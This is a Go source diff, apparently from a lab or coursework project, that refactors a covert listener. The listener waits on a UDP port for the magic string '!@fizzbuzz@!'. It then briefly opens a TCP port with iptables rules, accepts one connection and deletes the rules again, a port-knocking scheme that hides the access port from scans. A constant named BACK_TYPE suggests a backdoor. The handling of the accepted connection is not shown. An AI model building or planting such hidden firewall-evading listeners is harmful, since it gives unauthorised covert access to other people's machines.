@@ -183,33 +183,35 @@ const (
 	CONN_HOST    = "10.0.2.5"
 	CONN_PORT    = "3333"
 	CONN_UDPPORT = "6666"
-	CONN_TYPE    = "tcp"
+	BACK_TYPE    = "tcp"
+	SHAKE_TYPE   = "udp"
+	CONN_TIMEOUT = 2
 )
 
-func openUDPPorts() {
+func openUDPRules() {
 	openInPort := exec.Command("iptables", "-I", "INPUT", "-p", "udp", "--dport", CONN_UDPPORT, "-j", "ACCEPT")
-	openOutPort := exec.Command("iptables", "-I", "INPUT", "-p", "udp", "--dport", CONN_UDPPORT, "-j", "ACCEPT")
+	openOutPort := exec.Command("iptables", "-I", "OUTPUT", "-p", "udp", "--dport", CONN_UDPPORT, "-j", "ACCEPT")
 	openInPort.Run()
 	openOutPort.Run()
 }
 
-func closeUDPPorts() {
-	closeInPort := exec.Command("iptables", "-I", "INPUT", "-p", "udp", "--dport", CONN_UDPPORT, "-j", "DROP")
-	closeOutPort := exec.Command("iptables", "-I", "OUTPUT", "-p", "udp", "--dport", CONN_UDPPORT, "-j", "DROP")
+func openTCPRules() {
+	openInPort := exec.Command("iptables", "-I", "INPUT", "-p", "tcp", "--dport", CONN_PORT, "-j", "ACCEPT")
+	openOutPort := exec.Command("iptables", "-I", "OUTPUT", "-p", "tcp", "--dport", CONN_PORT, "-j", "ACCEPT")
+	openInPort.Run()
+	openOutPort.Run()
+}
+
+func deleteUDPRules() {
+	closeInPort := exec.Command("iptables", "-D", "INPUT", "-p", "udp", "-m", "udp", "--dport", CONN_UDPPORT, "-j", "ACCEPT")
+	closeOutPort := exec.Command("iptables", "-D", "OUTPUT", "-p", "udp", "-m", "udp", "--dport", CONN_UDPPORT, "-j", "ACCEPT")
 	closeInPort.Run()
 	closeOutPort.Run()
 }
 
-func openPorts() {
-	openInPort := exec.Command("iptables", "-I", "INPUT", "-p", "tcp", "--dport", CONN_PORT, "-j", "ACCEPT")
-	openOutPort := exec.Command("iptables", "-I", "INPUT", "-p", "tcp", "--dport", CONN_PORT, "-j", "ACCEPT")
-	openInPort.Run()
-	openOutPort.Run()
-}
-
-func closePorts() {
-	closeInPort := exec.Command("iptables", "-I", "INPUT", "-p", "tcp", "--dport", CONN_PORT, "-j", "DROP")
-	closeOutPort := exec.Command("iptables", "-I", "OUTPUT", "-p", "tcp", "--dport", CONN_PORT, "-j", "DROP")
+func deleteTCPRules() {
+	closeInPort := exec.Command("iptables", "-D", "INPUT", "-p", "tcp", "-m", "tcp", "--dport", CONN_PORT, "-j", "ACCEPT")
+	closeOutPort := exec.Command("iptables", "-D", "OUTPUT", "-p", "tcp", "-m", "tcp", "--dport", CONN_PORT, "-j", "ACCEPT")
 	closeInPort.Run()
 	closeOutPort.Run()
 }
@@ -220,29 +222,29 @@ func main() {
 	signal.Notify(c, os.Interrupt, syscall.SIGTERM)
 	go func() {
 		<-c
-		fmt.Println("CLEANING UP PORTS")
-		closePorts()
-		closeUDPPorts()
+		fmt.Println("CLEANING UP IPTABLES")
+		deleteUDPRules()
+		deleteTCPRules()
 		os.Exit(1)
 	}()
 
 	// Goroutine for TCP connection
 	fmt.Println("Listening on " + CONN_HOST + ":" + CONN_PORT)
-	tcpAddr, _ := net.ResolveTCPAddr(CONN_TYPE, CONN_HOST+":"+CONN_PORT)
+	tcpAddr, _ := net.ResolveTCPAddr(BACK_TYPE, CONN_HOST+":"+CONN_PORT)
 	connAttempt := make(chan bool)
 	connReady := make(chan bool)
 	go func() {
 		for {
-			closePorts()
+			deleteTCPRules()
 			connReady <- true
 			<-connAttempt
-			openPorts()
-			sock, err := net.ListenTCP(CONN_TYPE, tcpAddr)
+			openTCPRules()
+			sock, err := net.ListenTCP(BACK_TYPE, tcpAddr)
 			if err != nil {
 				fmt.Println("Error listening:", err.Error())
 				os.Exit(1)
 			}
-			sock.SetDeadline(time.Now().Add(4 * time.Second))
+			sock.SetDeadline(time.Now().Add(CONN_TIMEOUT * time.Second))
 			conn, err := sock.Accept()
 			sock.Close()
 			if err != nil {
@@ -257,24 +259,25 @@ func main() {
 
 	// This part below silently listens for the magic word
 	// to open up the tcp port
-	udpAddr, _ := net.ResolveUDPAddr("udp", CONN_HOST+":"+CONN_UDPPORT)
+	udpAddr, _ := net.ResolveUDPAddr(SHAKE_TYPE, CONN_HOST+":"+CONN_UDPPORT)
 	buf := make([]byte, 1024)
-	conn, err := net.ListenUDP("udp", udpAddr)
+	conn, err := net.ListenUDP(SHAKE_TYPE, udpAddr)
 	if err != nil {
 		fmt.Println("Error listening:", err.Error())
 		os.Exit(1)
 	}
 	for {
 		<-connReady
-		openUDPPorts()
+		openUDPRules()
 		for {
 			r, _ := conn.Read(buf)
 			msg := string(buf[:r])
 			if msg == "!@fizzbuzz@!" {
+				fmt.Println("Received a connection request, opening TCP port...")
 				break
 			}
 		}
-		closeUDPPorts()
+		deleteUDPRules()
 		connAttempt <- true
 	}
 }
